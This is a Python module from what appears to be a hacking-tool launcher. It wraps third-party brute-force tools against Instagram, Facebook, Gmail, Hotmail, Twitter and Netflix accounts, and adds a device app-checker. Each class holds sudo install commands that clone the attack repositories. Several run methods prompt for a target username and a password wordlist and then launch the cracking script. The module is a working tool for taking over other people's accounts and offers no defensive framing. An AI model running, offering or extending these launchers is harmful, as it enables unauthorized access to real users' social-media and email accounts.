# coding=utf-8
import contextlib
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection


class InstaBrute(HackingTool):
    TITLE = "Instagram Attack"
    DESCRIPTION = "Brute force attack against Instagram"
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/chinoogawa/instaBrute.git",
        "cd instaBrute;sudo pip2.7 install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/chinoogawa/instaBrute"

    def run(self):
        name = input("Enter Username >> ")
        wordlist = input("Enter wordword list >> ")
        os.chdir("instaBrute")
        subprocess.run(
            ["sudo", "python", "instaBrute.py", "-u", f"{name}", "-d",
             f"{wordlist}"])


class BruteForce(HackingTool):
    TITLE = "AllinOne SocialMedia Attack"
    DESCRIPTION = "Brute_Force_Attack Gmail Hotmail Twitter Facebook Netflix \n" \
                  "[!] python3 Brute_Force.py -g <Account@gmail.com> -l <File_list>"
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/Matrix07ksa/Brute_Force.git",
        "cd Brute_Force;sudo pip3 install proxylist;pip3 install mechanize"
    ]
    RUN_COMMANDS = ["cd Brute_Force;python3 Brute_Force.py -h"]
    PROJECT_URL = "https://github.com/Matrix07ksa/Brute_Force"


class Faceshell(HackingTool):
    TITLE = "Facebook Attack"
    DESCRIPTION = "Facebook BruteForcer"
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/Matrix07ksa/Brute_Force.git",
        "cd Brute_Force;sudo pip3 install proxylist;pip3 install mechanize"
    ]
    PROJECT_URL = "https://github.com/Matrix07ksa/Brute_Force"

    def run(self):
        name = input("Enter Username >> ")
        wordlist = input("Enter Wordlist >> ")
        # Ignore a FileNotFoundError if we are already in the Brute_Force directory
        with contextlib.suppress(FileNotFoundError):
            os.chdir("Brute_Force")
        subprocess.run(
            ["python3", "Brute_Force.py", "-f", f"{name}", "-l", f"{wordlist}"])


class AppCheck(HackingTool):
    TITLE = "Application Checker"
    DESCRIPTION = "Tool to check if an app is installed on the target device through a link."
    INSTALL_COMMANDS = [
        "sudo git clone https://github.com/jakuta-tech/underhanded.git",
        "cd underhanded && sudo chmod +x underhanded.sh"
    ]
    RUN_COMMANDS = ["cd underhanded;sudo bash underhanded.sh"]
    PROJECT_URL = "https://github.com/jakuta-tech/underhanded"


class SocialMediaBruteforceTools(HackingToolsCollection):
    TITLE = "SocialMedia Bruteforce"
    TOOLS = [
        InstaBrute(),
        BruteForce(),
        Faceshell(),
        AppCheck()
    ]
